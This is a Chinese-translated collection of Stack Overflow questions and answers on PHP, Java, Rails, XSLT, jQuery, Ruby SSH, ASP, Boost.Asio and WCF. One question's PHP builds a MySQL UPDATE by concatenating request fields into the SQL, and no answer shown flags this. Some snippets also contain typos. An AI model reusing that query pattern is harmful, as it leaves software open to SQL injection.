那里有一个错误，应该是“set_error_handler”而不是“set_error_handling”

```
set_error_handler('myErrorHandler'); 
```

也许这样的事情会有所帮助。

```
function myErrorHandler($errno, $errstr, $errfile, $errline)
{
$refresh = '10';
$pathdirectory = "";
echo "Oh no! Error: $errno, $errstr";
echo "<meta http-equiv=\"refresh\" content=\"$refresh;url=$pathdirectory\" />";
}

set_error_handler('myErrorHandler'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-12-03T18:02:32.390

**将此代码放在页面开始以进行注册关闭事件（仅支持 PHP 5.2+）**

代码详细信息：当任何致命或其他错误将导致您的 php 页面崩溃或关闭时，此事件将调用并在 X($errorRefreshSecs) 秒后自动刷新当前页面**

```
<?php
function shutDownFunction() { 
$error = error_get_last();
// fatal error, E_ERROR === 1
if ($error['type'] === E_ERROR) { 
//do your stuff     
echo "<font color='red'>Oh no! fatal Error: ".$error["message"]." at line number: ".$error["line"]."</font><br>";
$errorRefreshSecs="3";
echo "please auto refresh page after $errorRefreshSecs Secs and try again!<br>";
?>
<meta http-equiv="refresh" content="<?php echo $errorRefreshSecs;?>; URL=<?php echo 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; ?>">
<?php
}//if end  //if ($error['type'] === E_ERROR) {
}
register_shutdown_function('shutDownFunction');//(only support on PHP 5.2+)
?> 
```

# java - Java字符串替换

> ID：13076397
> 
> 赞同：0
> 
> 时间：2012-10-25T20:07:26.330
> 
> 标签：java, optimization, input

我是 Java 新手，我正在尝试学习优化代码以使其为生产做好准备。我在下面有以下代码。我想知道如何优化它。我认为通过使用一小段可能，这将是一个很好的学习方式。

几点：
1.该功能将运行多次，它需要快速。
2\. 输入不受约束，因为它可能来自用户或文件。有没有办法解决这个问题，所以不会抛出异常？我正在考虑使用正则表达式。
3\. 我还需要做些什么来准备生产吗？例如单元测试。如果是这样，最好的方法是什么？
4\. 我假设要搜索的字符串不是很长。
5\. 当我说优化时，我的意思是做一些事情，比如用更快的东西替换“+”运算符，它会影响内存和性能等。

```
public String strReplave(String originalStr, String oldStr, String newStr) {
    int start = 0;
    while ((start = originalStr.indexOf(oldStr, start)) > 0) {
        originalStr= originalStr.substring(0,start) + newStr+ originalStr.substring(start + oldStr.length());
    start += newStr.length();
}
return originalStr;
} 
```

感谢您的帮助，如果您需要我澄清任何事情，请告诉我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:09:58.213

没有什么比内置方法更好的`input.replace(old,new)`了，因此没有理由真正尝试自己重新实现它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:11:15.620

两点：

1.  String 类中有一个 replaceAll 和一个 replaceFirst 方法（与正则表达式一起使用），您可能想要使用它。
2.  在您的代码中效率非常低的一件事是您使用“+”运算符连接字符串。您应该查看 StringBuilder 类。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T20:12:18.693

这就是我使用的：

```
public static String replaceString(String cadena, String word, String newWord) {
    Pattern pat = Pattern.compile(word);   
    Matcher mat = pat.matcher(cadena);  
    return mat.replaceAll(newWord); 
} 
```

你真的不需要知道正则表达式来使用它，因为它会匹配一个文字字符串，就像`"a literal string"`我不知道它是否是你所要求的，但对我来说效果很好。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-25T20:12:42.110

除了使用内置函数之外，只有我的两分钱。让代码的作用*一目了然。*然而，包括您的程序可能失败的所有可能条件。

使用`try{} catch()`{异常处理}

在尝试优化代码*之前*测量你的代码和瓶颈在哪里。不要猜测。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-25T20:16:12.057

```
public static String replace(String originalStr, String oldStr, String newStr) {
    int p = originalStr.indexOf(oldStr);
    if (p == -1) {
        return originalStr;
    } else {
        StringBuilder result = new StringBuilder();
        result.append(originalStr, 0, p);
        result.append(newStr);
        int q = p + oldStr.length();
        while ((p = originalStr.indexOf(oldStr, q)) != -1) {
            result.append(originalStr, q, p);
            result.append(newStr);
            q = p + oldStr.length();
        }
        result.append(originalStr, q, originalStr.length());
        return result.toString();
    }
} 
```

*   用于`StringBuilder`连接字符串。
*   如果未找到搜索字符串，则进行优化。如果这种情况不经常发生，你可以跳过这个。

# ruby-on-rails - 如果给定字符串在 url 中匹配，则路由

> ID：13076405
> 
> 赞同：0
> 
> 时间：2012-10-25T20:07:41.020
> 
> 标签：ruby-on-rails

我有一个`join=yes`可以通过 GET 传递给我的任何应用程序 url 的简单方法。当检测到它时，它只是重定向到特定的`JoinsController`控制器。否则它只会保持正常流量。

我的问题是如何匹配特定模式`join=yes`，以便将其重定向到`JoinsController`？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T20:32:19.350

尝试在你的`routes.rb`. 例如：

```
constraints(:join => "true") do
  match '/*path', :to => redirect(url)
end 
```

更多关于 Rails API 中的约束[- ActionDispatch::Routing::Mapper::Scoping](http://api.rubyonrails.org/classes/ActionDispatch/Routing/Mapper/Scoping.html#method-i-constraints)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T20:33:27.800

由于您希望重定向发生在所有其他控制器上，您可以通过多种方式进行。我会这样做的方式是这样的：

**application_controller.rb**

```
def ApplicationController<ActionController::Base
  before_filter :needs_join_controller

  def needs_join
    redirect_to your_controller_action_path and return if params[:join] == "yes"
  end
end 
```

然后你的加入控制器需要在过滤器之前跳过这个以避免多次重定向

**joins_controller.rb**

```
def JoinsController < ApplicationController
  skip_before_filter :needs_join_controller

end 
```

# java - 将 XML 转换为属于同一模式的不同版本的稍有不同的 XML

> ID：13076409
> 
> 赞同：0
> 
> 时间：2012-10-25T20:07:52.433
> 
> 标签：java, xml, xslt, jaxb, mule

我需要将作为我的应用程序输入的一个 XML（比如 x1.xml）转换为基于相同模式的较新版本的稍微不同的 XML（比如 x2.xml）格式。x2 是我的应用程序的输出。x1 和 x2 中大约 90% 的元素是相同的，因为它们属于相同的模式（只是版本不同）。

什么是最好的转型方法。我正在使用 java 和 mule esb。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T22:46:49.600

这是 XSLT 的基本任务。从默认情况下复制元素不变的标识模板规则开始：

```
<xsl:template match="*">
 <xsl:copy>
   <xsl:copy-of select="@*"/>
   <xsl:apply-templates/>
 </xsl:copy>
</xsl:template> 
```

然后为您要修改的任何元素添加更多模板规则。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:10:54.733

这取决于文档的大小、所需的转换类型以及您要运行它的次数。您需要权衡学习选择技术的成本与它将提供的好处。

我个人会从 xslt 样式表或 Java DOM api 开始，因为这是我所熟悉的。如果性能不符合您的要求，请切换到其他选择之一。

# php - jQuery 更新 mysql 表

> ID：13076415
> 
> 赞同：1
> 
> 时间：2012-10-25T20:08:25.203
> 
> 标签：php, jquery, mysql, updates

我在使用 Jquery 更新 MySQL 行时遇到问题。

这是我当前的代码。

```
<script type="text/javascript">
$(document).ready(function(){
$(".insert").click(function(){

var id=$("#id").val();
var ip=$("#ip").val();
var permissions=$("#permissions").val();
var password=$("#password").val();
var key=$("#key").val();

$.post('myscript.php?action=updateAPIuser', {id: id, ip: ip, permissions: permissions,     password: password, key:key },
function(data){
$("#message").html(data);
$("#message").hide();
$("#message").fadeIn(1500); 
});
return false;
});
});   
</script> 
```

这是html：

```
<table width="100%" border="0" cellspacing="1" cellpadding="3">
<tr>
<th>Customer</th>
<th>Permission</th>
<th>IP</th>
<th>Key</th>
<th>Password</th>
<th>Date added</th>
<th>Action</th>
</tr>
<tr class="record" id="record-1"><td>John Doe</td>
<td><select id="permissions" name="permissions" />
<option value="ro" selected>Read Only</option>
<option value="rw">Read Write</option>
</select></td>
<td><input type="text" id="ip" name="ip" value="1.1.1.13">
<input type="hidden" id="id" name="id" value="1"></td>
<td><input type="text" id="key" name="key" value="mijnkey"></td>
<td><input type="text" id="password" name="password" value="password000"></td>
<td>2012-10-24 20:48:25</td><td><a class="insert" title="Update data" href="#"><img src="images/icons/save.png" title="Save" alt="Save"></a> 
</td></tr>

<tr class="record" id="record-2"><td>Jane Doe</td>
<td><select id="permissions" name="permissions" />
<option value="ro" selected>Read Only</option>
<option value="rw">Read Write</option>
</select></td>
<td><input type="text" id="ip" name="ip" value="2.2.1.13">
<input type="hidden" id="id" name="id" value="1"></td>
<td><input type="text" id="key" name="key" value="janeskey"></td>
<td><input type="text" id="password" name="password" value="pass000"></td>
<td>2012-10-24 20:48:25</td><td><a class="insert" title="Update data" href="#"><img src="images/icons/save.png" title="Save" alt="Save"></a> 
</td></tr>
</table> 
```

当然，我有用于更新 MySQL 行的 php。

问题是这样的：当我点击保存（又名更新）时，Jquery 总是更新 ID 为 1 的行。无论我点击哪一行。

所以我的问题是：如何更改代码，以便正确的行得到更新？

干杯，枢纽

PS这是我更新行的PHP代码：

```
function updateAPIuser($req){
global $db_whmcs, $_LANG;    

$id = $req['id'];
$ip = $req['ip'];
$permissions = $req['permissions'];
$password = $req['password'];
$key = $req['key'];
$updated = date("Y-m-d H:i:s");

header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); // Date in the past
header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT"); // always modified
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0"); // HTTP/1.1
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache"); // HTTP/1.0

  $query = "UPDATE `mod_powerdns_api` SET 
`ip` = '".$ip."',
`key` = '".$key."',
`permissions` = '".$permissions."',
`updated` = '".$updated."', 
`password` = '".$password."' 
WHERE `id` = ".$id;

mysql_query($quer) or pdns_die('Can not update user'.mysql_error()); 
```

} // 结尾

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T20:12:13.747

首先，您不应该使用重复的 id。

来自[http://www.w3schools.com/tags/att_global_id.asp](http://www.w3schools.com/tags/att_global_id.asp)

> 定义和使用
> 
> id 属性为 HTML 元素指定一个唯一的 id（该值在 HTML 文档中必须是唯一的）。

您可以使用以下代码获取正确的 id：

```
var id = $(this).find('[name="id"]').val(); 
```

其他元素也可以通过相同的方式找到：

```
$(".insert").bind('click', function(){
    var tr = $(this).parents('tr');

    var id = tr.find('[name="id"]').val();
    var ip = tr.find('[name="ip"]').val();
    var permissions = tr.find('[name="permissions"] option:selected').val();
    var password = tr.find('[name="password"]').val();
    var key = tr.find('[name="key"]').val();
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:22:00.663

您的代码中的问题是因为您的**HTML中有重复的 '** **id's**

 **在这种情况下，您可以使用类..尝试完全删除 id 属性..

试试这个方法。。

```
$(".insert").click(function(clickmychick){

    var $tr = $(this).closest('tr') ;  // Cache the closest tr

    var id= $tr.find('[name="id"]')val();
    var ip= $tr.find('[name="ip"]')val();
    var permissions=$tr.find('[name="permissions"] option:selected').attr('value');
    var password= $tr.find('[name="password"]')val();
    var key= $tr.find('[name="key"]')val();
} 
```**

# c# - 我正在学习使用 C# 和 Visual Studio 2010 编写 Windows 窗体应用程序，我已经过了“hello world”，下一步有什么好的？

> ID：13076417
> 
> 赞同：-4
> 
> 时间：2012-10-25T20:08:29.937
> 
> 标签：c#, winforms, visual-studio

我正在学习使用 C# 和 Visual Studio 2010 编写 Windows 窗体应用程序，我已经过了“hello world”，下一步有什么好的？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T20:10:42.980

制作一个文本框，您可以从中接收数据，提交该表单，然后在某处显示结果。做一些事情来使你的程序具有交互性。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T20:10:30.670

开始在这些表单上添加更多控件，例如温度转换器或简单的 RPN 计算器。

任何能让你思考表单元素之间交互的东西都会让你超越`HelloWorld`.

# ruby - Ruby：Net::SSH::Multi 使用密钥

> ID：13076419
> 
> 赞同：1
> 
> 时间：2012-10-25T20:08:33.303
> 
> 标签：ruby, ssh, tty, net-ssh

我在让 Net::SSH::Multi 库工作时遇到问题，它应该连接到每个盒子并运行该命令，我正在尝试获取输出。

这是我的代码：

```
#!/usr/bin/env ruby
require 'rubygems'
require 'net/ssh'
require 'net/ssh/multi'

@ssh_responses = Array.new
puts "Starting vhost grab..."
# SSH into each instance, and download Vhost Dump
Net::SSH::Multi.start(:on_error => :ignore) do |ssh|

  ssh.use 'ec2-1-1-1-1.compute-1.amazonaws.com', :user => 'portal_user', :keys => ['~/.ssh/portal_user.pem']
  ssh.use 'ec2-1-1-1-2.compute-1.amazonaws.com', :user => 'portal_user', :keys => ['~/.ssh/portal_user.pem']
  puts "Added servers..."
  stdout = ""
  # run this on all boxes
  ssh.exec 'pwd' do |channel, stream, data|
    puts "Trying execution..."
    channel.request_pty do |c, success|
      puts "Trying to request tty..."
      if success
        puts "Successfully requested tty"
        command = "sudo ls /root"
        c.exec(command) do |c, success, data|
          puts "Executing commands..."
          stdout << data if stream == :stdout
        end
        @ssh_responses << stdout
        puts "Storing responses..."
      end
    end
  end

  ssh.loop

end

puts @ssh_responses
puts "Script executed." 
```

我从跑步中得到的回应是：

```
$ ruby serverAction.rb 
Starting vhost grab...
Added servers...
Trying execution...
Script executed. 
```

# jquery - 由 IIS 串行处理的经典 ASP 并行 Ajax 调用（会话锁？）

> ID：13076424
> 
> 赞同：1
> 
> 时间：2012-10-25T20:08:43.753
> 
> 标签：jquery, iis, asp-classic, synchronization

我正在维护一个应用程序编写的经典 ASP 托管在 IIS 7.0 上。一段时间以来，当我们连续进行 3 个应该并行发生的 Ajax 调用时，我观察到一个性能问题，但是看起来 IIS 正在串行执行它们。这是一个问题，因为第一个 Ajax 调用是一个耗时的调用，并且没有理由让第二个和第三个查询在它之前返回。

我认为问题在于，在调用期间，会生成会话对象，并且我们正在对每个调用中的会话进行修改。我相信 IIS 因此会序列化 Ajax 调用。

我的问题是，有没有办法因为会话而关闭锁定，但仍然保持会话“打开”，以便我们仍然可以从中读取？我找到了可以使用的 EnableSessionState 属性，但是它完全禁用了会话，这是我不希望发生的。

我知道从长远来看，禁用锁可能不是最好的解决方案，但是在 Ajax 调用之间踩踏变量应该是最小的。非常感谢有关如何解决此问题的任何建议。

米

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T06:37:12.160

据我所知，没有办法并行使用会话；它们按照定义是连续的，因为它们在同一个“公寓”（STA）中运行。

如果可能，您可以将值存储在应用程序对象中，因为它在 MTA（多线程）中运行。您可以使用 MSXML2.FreeThreadedDomDocument 来存储每个用户的值（例如，使用存储在 cookie 中的唯一键或类似的东西来获取用户数据）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T04:39:12.973

如果您不需要更改任何会话变量，您可以执行以下操作：

使用以下命令创建一个为该页面关​​闭会话状态的新页面：

```
<%@ EnableSessionState=False %> 
```

将会话中所需的数据输出到主页面，然后在 jQuery 调用中传递该数据。

# java - 第一个计时器.. java异常

> ID：13076427
> 
> 赞同：0
> 
> 时间：2012-10-25T20:08:50.717
> 
> 标签：java, apache-pig

我是java世界的新手。但基本上我正在尝试用pig-latin编写一个用户定义的函数。

以下是相关代码。

```
public class time extends EvalFunc<String>{

public String exec(Tuple input) throws IOException {

    if ((input == null) || (input.size() == 0))
        return null;
    try{
        String time = (String) input.get(0) ;
        DateFormat df = new SimpleDateFormat("hh:mm:ss.000");
        Date date = df.parse(time);
        String timeOfDay = getTimeOfDay(date);
        return timeOfDay;
    } catch (IOException e) {
        throw e;
    }

} 
```

所以基本上输入是一个元组......我检查元组是否为空......然后将该日期字符串转换为时间对象......然后解析时间部分......然后是函数

```
 getTimeOfDay(date) returns a string... like breakfast, lunch dinner.. or empty string depending on the time hours.. 
```

现在的问题是我的日食说和错误（红线）

```
 Date date = df.parse(time);
 String timeOfDay = getTimeOfDay(date); 
```

说

```
 Unhandled exception type ParseException 
```

但无论我尝试什么（给了我 3 个选项.. 将 catch 子句添加到周围的 try，将异常添加到现有的 catch 块并用 try/catch 包围..），错误会发生变化.. 但始终是 tehre。

而且我什至不确定我可以改变程序的结构..（方法声明等）..

我该如何解决这个问题。

```
 A quick guide on udf http://wiki.apache.org/pig/UDFManual 
```

如果你知道猪..或者知道一个简单的方法..那么基本上我要做的是..给定一个“时间，id，金额”类型的输入字符串，检查交易是在一天中的什么时间进行的？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:19:27.870

*   如果您的 exec 方法已经声明为抛出 IOException，则无需捕获并抛出它，因为`throws`声明会自动执行此操作。
*   至于 ParseException 你必须决定如何处理它。
*   还缺少一个括号=）

所以你的代码应该是：

```
public class time extends EvalFunc<String>{

public String exec(Tuple input) throws IOException {

    if ((input == null) || (input.size() == 0))
        return null;
    try{
        String time = (String) input.get(0) ;
        DateFormat df = new SimpleDateFormat("hh:mm:ss.000");
        Date date = df.parse(time);
        String timeOfDay = getTimeOfDay(date);
        return timeOfDay;
    } catch (ParseException e) {
        //how will I handle when df.parse(time) fails and throws ParseException?
        //maybe:
        return null;
    }
  } //exec

} //class 
```

# c++ - 在 Windows 中使用 boost::asio 检测套接字关闭

> ID：13076432
> 
> 赞同：2
> 
> 时间：2012-10-25T20:09:04.977
> 
> 标签：c++, sockets, boost-asio, winsock, disconnect

所以我有一个服务方法用于`io_service::poll()`处理任何当前准备好的读/写事件：

```
void Foo::service()
{
  io.poll(); // boost::asio::io_service
  if (socket.is_open())
    if (socket.available())
      notifyReadyToRead();
    else
      notifyReadyToWrite();
} 
```

但是，如果远程套接字关闭（优雅地或其他方式），我也想触发行为。我知道 Winsock 可以处理这个问题，因为它会在这种情况下引发网络事件。然而，据我所知，Boost Asio 套接字对此没有内置支持。

`boost::asio::buffer(socket, 0)`我已经尝试读取和写入一个零字节数据包到套接字以测试它是否有错误，但是如果你在没有实际检查套接字的情况下通过它，那么实现似乎只是成功地退出了。

我还听说留下挂起的读取操作可能会起作用，但我不确定如何管理它，同时仍然允许常规`boost::asio::read`和 'boost::asio::write` 操作正常工作。

最后，在应用层协议中添加 ping 操作是不行的；此类旨在通用，即使不是，我也无法更改远程端的协议。

虽然我更喜欢便携式解决方案，但特定于 Windows 的解决方案就足够了，即使这意味着以这种方式获取本机句柄并枚举事件。（这发生在我身上，但`WSAEnumNetworkEvents`清除了事件的内部记录，所以我怀疑如果 boost::asio 实现依赖于读取它会导致问题。）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T00:45:18.063

您可以启用套接字选项 TCP_KEEPALIVE，但仍需要挂起的读取操作才能接收读取失败的通知。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-27T12:39:00.227

在一般情况下，您必须实现一些应用程序级别的机制来检测各种断开连接。关于这个主题有很多关于 boost/asio ML 的讨论，[这里是其中的一个](http://thread.gmane.org/gmane.comp.lib.boost.asio.user/5142)。

# html - JQuery / HTML / CSS 灰度到彩色图像滑块

> ID：13076442
> 
> 赞同：2
> 
> 时间：2012-10-25T20:09:44.577
> 
> 标签：html, jquery-ui, css

我希望这里有人可以帮助我。我目前正在为客户建立一个网站，在索引页面上将是一个图像滑块/推子，它将显示一系列图像。客户要求的是从一个图像到另一个图像的过渡，以便序列中的下一个图像以灰度淡入并慢慢变为彩色并暂停几秒钟，然后再加载下一个图像。

我一直在使用一个适用于过渡效果的图像推子，但想针对灰度功能对其进行修改。作为 jQuery 的新手，互联网上似乎没有任何“现成的”，所以我有点挣扎。

我的 CSS 如下：

```
.index_slideshow { position:relative; height:340px; width:980px; margin:auto; }
.index_slideshow IMG { position:absolute; top:0; left:0; z-index:8; }
.index_slideshow IMG.active { z-index:10; }
.index_slideshow IMG.last-active { z-index:9; } 
```

我的jQuery如下：

```
function slideSwitch() {
var $active = $('.index_slideshow IMG.active');

if ( $active.length == 0 ) $active = $('.index_slideshow IMG:last');
var $next =  $active.next().length ? $active.next()
    : $('.index_slideshow IMG:first');
$active.addClass('last-active');

$next.css({opacity: 0.0 })
    .addClass('active')
    .animate({opacity: 1.0}, 1000, function() {
        $active.removeClass('active last-active');
    });
}

$(function() {
setInterval( "slideSwitch()", 5000 );
}); 
```

我的 HTML 是：

```
<div class="index_slideshow" id="index_slideshow">
<img src="images/img2.jpg" alt="" />
<img src="images/img.jpg" alt="" />
</div> 
```

希望可以有人帮帮我！:-)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-27T23:07:16.423

一种简单的方法是将图像的灰度版本插入幻灯片：

```
<div class="index_slideshow" id="index_slideshow">
<img src="images/img2.jpg" alt="" />
<img src="images/img2grey.jpg" alt="" />
<img src="images/img1.jpg" alt="" />
<img src="images/img1grey.jpg" alt="" />
</div> 
```

（我从您的 img 顺序假设代码中显示较低的图像首先显示......但如果这是一个不正确的假设，只需交换 imgX.jpg 和 imgXgrey.jpg 的位置。）

除此之外，您正在查看 Canvas 元素和 IE 过滤器的组合：[http](http://www.ajaxblender.com/howto-convert-image-to-grayscale-using-javascript.html) ://www.ajaxblender.com/howto-convert-image-to-grayscale-using-javascript.html （忽略说代码是 PHP。它是 Javascript。这些标签可能是旧 CMS 遗留下来的。）

您必须扩展它以在灰度和彩色之间为每个步骤设置动画，因此只要您不处理大量图像，第一种方法是最简单的。

# yesod - 当我输入 yesod devel 时出现错误：找不到文件 devel.hs

> ID：13076444
> 
> 赞同：2
> 
> 时间：2012-10-25T20:09:49.897
> 
> 标签：yesod, haskell-platform

当我输入 yesod devel 时，出现以下错误：

> 错误：找不到文件 devel.hs

我该如何解决？

我在 Ubuntu 12.04.1 LTS 上，我的 ghc 版本是 7.4.1，我的 yesod 版本是 0.10.2.1

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T05:37:29.167

听起来您还没有设置 Yesod 脚手架。首先运行“yesod init”，然后 cd 进入创建的目录并尝试“yesod devel”。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-01-16T11:50:56.673

使用堆栈创建和构建项目。请使用'stack new'创建一个新项目并再次初始化。

# asp.net - 从 WCF 中的 ASP.NET RESTful Web 服务返回错误的最佳实践

> ID：13076445
> 
> 赞同：3
> 
> 时间：2012-10-25T20:09:49.867
> 
> 标签：asp.net, wcf

这是我的服务代码。就像所有最佳实践文章所建议的那样，我以 WebFaultException 的形式抛出一个错误。

```
[ServiceContract(Namespace = "")]
[AspNetCompatibilityRequirements(RequirementsMode = AspNetCompatibilityRequirementsMode.Allowed)]
public class API
{
    [OperationContract]
    [WebGet()]
    public int MyMethod()
    {
        throw new WebFaultException<string>("TESTERROR", HttpStatusCode.BadRequest);
    }
} 
```

现在，当向我发送一个请求时，`http://localhost:1389/API.svc/MyMethod`我得到的是这个 JSON 对象：

> {"ExceptionDetail":null,"ExceptionType":null,"Message":"由于内部错误，服务器无法处理请求。有关错误的更多信息，请打开 IncludeExceptionDetailInFaults（来自 ServiceBehaviorAttribute 或来自配置行为），以便将异常信息发送回客户端，或根据 Microsoft .NET Framework 3.0 SDK 文档打开跟踪并检查服务器跟踪日志。","StackTrace":null}

我尝试`includeExceptionDetailInFaults`在我的 web.config 中启用，消息确实发生了一些变化，但我仍然没有在任何地方看到我的“TESTERROR”！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:21:27.923

我认为正在发生的事情是你没有任何形式的回报发生，只有一个响应代码。因此，您的服务器在没有任何其他信息的情况下抛出 500。您仍然可以通过将异常详细信息输出到日志文件来使用它。

我通常做的是创建一个可序列化的响应对象，其中包含一条消息和我想要返回给客户端的任何代码。然后我捕获异常，构建响应对象并将其返回给客户端。然后客户端会收到一个可以读取的 xml 有效负载。因此，如果它不是 200（OK），那么我认为这是一个错误并显示适当的消息（或我在 xml.xml 中包含的详细信息）。

```
<ServiceError>
   <ServerCode>
      500
   </ServerCode>
   <ApplicationCode>
      9100
   </ApplicationCode>
   <Message>
      API key is expired.
   </Message>
</ServiceError> 
```

更新：

就 JSON 标准而言，我从未见过真正的文档标准。我所看到的是一种事实上的标准，或者更确切地说是一种趋势：

```
{
  "status": "success", //or "failed"
  "data": {
    //any app specific payload here
  },
  "message": null //or additional info here (i.e. exception details)
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-10T00:03:42.363

好的，事实证明您必须将其添加到 .svc 文件中：`Factory="System.ServiceModel.Activation.WebServiceHostFactory"`

`<behaviors>`并从 web.config中删除该部分，只留下以下内容：

```
<system.serviceModel>
    <serviceHostingEnvironment aspNetCompatibilityEnabled="true" multipleSiteBindingsEnabled="true" />
    <services>
        <service name="MyAPI"><endpoint address="" binding="webHttpBinding"/></service>
    </services>
</system.serviceModel> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-10-31T21:09:59.647

我遇到了同样的问题并调试了 wcf 库，ExeptionDetail 来自 WebScriptEnablingBehavior 中的这些行：

> `ExceptionDetail originalFaultDetail = fault.GetDetail<ExceptionDetail>();`

它尝试反序列化您设置为 ExceptionDetail 类型对象的错误并失败。在创建 WebFaultException 时使用 ExceptionDetail 类型：

> `throw new WebFaultException<ExceptionDetail>(new ExceptionDetail(new Exception("TESTERROR")), HttpStatusCode.BadRequest);`

# compression - 用于嵌入式系统核心转储的 .bss 和 .data 的 8/16/32/64 位对齐无损压缩

> ID：13076447
> 
> 赞同：1
> 
> 时间：2012-10-25T20:10:01.237
> 
> 标签：compression, alignment, coredump, sparc, lossless

我正在为以下任务寻找一种快速/无损/固定间隔压缩算法。

我有一个嵌入式系统。内存/闪存资源不足。

我想为它生成一个核心转储并将结果存储在闪存中和/或通过慢速串行线路将其吸出。

我需要的只是堆、堆栈、.data 和 .bss 段以及一些内存映射寄存器。

该设备是 Leon Sparc Softcore。

现在，这些数据作为几个奇怪的数据表明

1.  通常的 LZW / Zlib / ... 压缩库不会那么好。（不是自然语言语料库）。
2.  Sparcs 对对齐非常着迷。IE。我可以保证.bss 和 .data 段中的*每个*项目都是（有效地）在 8、16、32、64 位地址边界处相应对齐的 8、16、32 或 64 位 int。
3.  我必须为压缩代码保留一个小的固定空间。
4.  这是一台 32 位机器，其 bss 和数据段的大小远小于 4gb。
5.  系统中的大多数 32 位值是符号的地址。IE。4 gig 可能值的一个非常小的子集。

我目前的计划是……扫描整个 .bss / .data 段并计算 16 位值的完整直方图。

由此我可以得到一个完美的霍夫曼编码。但我怀疑考虑到 32 位/64 位值的内部结构，我可以做得更好。（例如，最高有效位的可变性远小于最低有效位的可变性。）

和指针/建议/现有的工作？

# java - 如何从 .net 和 wcf 使用 java webservice

> ID：13076456
> 
> 赞同：2
> 
> 时间：2012-10-25T20:10:11.800
> 
> 标签：java, .net, xml, sign, webservices-client

我陷入了互操作性问题。我来自 .net，必须通过使用 x509 证书签署请求来使用 Java 安全服务。我在 .net wcf 客户端中有 WSDL 和生成的服务引用，并在 app.config 中添加了 x509 证书凭据，但客户端没有生成预期的 SOAP Payload（在 fiddler 中跟踪）并且 java 服务抛出错误。WCF 客户端是否可以按照 java 的预期生成有效负载？

下面是 Java Guys 给出的 Working Request Payload。

```
<soapenv:Envelope xmlns:smok="http://www.javaServer.org/schemas/SmokeTest" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
      <ds:Signature Id="SIG-53" xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
        <ds:SignedInfo>
          <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#">
            <ec:InclusiveNamespaces PrefixList="smok soapenv" xmlns:ec="http://www.w3.org/2001/10/xml-exc-c14n#"/>
          </ds:CanonicalizationMethod>
          <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
          <ds:Reference URI="#id-52">
            <ds:Transforms>
              <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#">
                <ec:InclusiveNamespaces PrefixList="smok" xmlns:ec="http://www.w3.org/2001/10/xml-exc-c14n#"/>
              </ds:Transform>
            </ds:Transforms>
            <ds:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>
            <ds:DigestValue>dCnj2a+0wptrFSyWzEgwetSTHmM=</ds:DigestValue>
          </ds:Reference>
        </ds:SignedInfo>
        <ds:SignatureValue>
          WgD3P8DWPG4eWXzXiD9+LZosn7ggRPpIC1OAmq9bn0s1HuGhM/fZozfDhEDn5sAF9RtVFiAZxC03
          4tW+cuxC5jAHH4GYQud6s5h5sGwvhLshQNVdI6HBBFQWr+J3mUEBbUCExJ6HEe1i2v0+dMQNWezo
          E1Ot7klNGxXedHzrlZw=
        </ds:SignatureValue>
        <ds:KeyInfo Id="KI-DE6BE13CF8D5419B66135109740345572">
          <wsse:SecurityTokenReference wsu:Id="STR-DE6BE13CF8D5419B66135109740345573">
            <ds:X509Data>
              <ds:X509IssuerSerial>
                <ds:X509IssuerName>CN=VeriSign Class 1 Individual Subscriber CA - G3,OU=Persona Not Validated,OU=Terms of use at https://www.verisign.com/rpa (c)09,OU=VeriSign Trust Network,O=VeriSign\, Inc.,C=US</ds:X509IssuerName>
                <ds:X509SerialNumber>51921456535433584705342517836423530149</ds:X509SerialNumber>
              </ds:X509IssuerSerial>
            </ds:X509Data>
          </wsse:SecurityTokenReference>
        </ds:KeyInfo>
      </ds:Signature>
    </wsse:Security>
  </soapenv:Header>
  <soapenv:Body wsu:Id="id-52" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
    <smok:HelloRequest>
      <smok:Name>Hello from Heruwala</smok:Name>
    </smok:HelloRequest>
  </soapenv:Body>
</soapenv:Envelope> 
```

* * *

